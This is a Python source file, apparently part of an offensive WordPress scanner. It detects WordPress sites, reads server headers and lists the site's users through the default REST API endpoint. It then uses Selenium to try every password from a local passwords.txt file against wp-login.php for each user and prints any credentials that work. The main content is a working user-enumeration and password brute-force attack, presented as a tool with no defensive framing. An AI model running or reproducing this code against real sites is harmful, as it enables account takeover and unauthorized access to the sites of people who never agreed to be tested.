from time import sleep
from selenium.webdriver.common.by import By
import os
import Classes.Browser as Browser
import requests
from alive_progress import alive_it


# Get the information for vulnerabilities or backdoors
def get_information(browser, url, html, scripts, styles, page):
    if is_rest_normal(url):
        print('Wordpress default rest api 😈')
        get_server_settings(url)
        # get_versions(browser, url, html, scripts, styles, page)
        get_users(browser, url)


def get_server_settings(url):
    print('Get server settings')
    request = requests.head(url)
    if "Server" in request.headers:
        print("Server : " + request.headers.get('Server'))
    if "X-Powered-By" in request.headers:
        print("Powered by : " + request.headers.get('X-Powered-By'))


def get_versions(browser, url, html, scripts, styles, page):
    print('Get plugins and theme')
    # print(scripts)


# Get users
def get_users(browser, url):
    users = get_users_of_rest(url)
    if users:
        print('found users:')
        for user in users:
            print('====================')
            print('ID:')
            print(user['id'])
            print('Name:')
            print(user['name'])
            print('Slug/ Username:')
            print(user['slug'])
            print('====================')
            try_logging_in(browser, url, user['slug'])


# Try logging in to WordPress
def try_logging_in(browser, url, username):
    browser.get(Browser.get_base_url(url) + "/wp-login.php")
    sleep(2)
    browser.find_element(By.ID, "user_login").send_keys(username)
    with open(os.path.abspath(os.getcwd()) + "/passwords.txt") as f_in:
        lines = list(line for line in (l.strip() for l in f_in) if line)
        print('Try passwords on users:')
        print(username)
        for line in alive_it(lines):
            browser.find_element(By.ID, "user_pass").send_keys(line)
            sleep(1)

            browser.find_element(By.ID, "wp-submit").click()

            sleep(2)
            if not Browser.check_exists_by_id(browser, "wp-submit"):
                print('Success!')
                print('Username: ' + username)
                print('Password: ' + line)
                break


# Get users of rest
def get_users_of_rest(url):
    response = requests.get(Browser.get_base_url(url) + "/wp-json/wp/v2/users")
    if not response.status_code == 200:
        return False
    return response.json()


# Is the rest endpoint default
def is_rest_normal(url):
    response = requests.get(Browser.get_base_url(url) + "/wp-json")
    if not response.status_code == 200:
        return False
    data = response.json()
    if "name" in data and "_links" in data:
        return True


# Are given assets from a wordpress
def is_wordpress(scripts, styles):
    is_a_wordpress = False
    if styles or scripts:
        if scripts:
            for script in scripts:
                if is_wordpress_asset(script):
                    return True
        if styles:
            for style in styles:
                if is_wordpress_asset(style):
                    return True

    return is_a_wordpress


# Is given asset a wordpress url
def is_wordpress_asset(url):
    if "/wp-content/" in url or "/wp-includes/" in url:
        return True
    else:
        return False
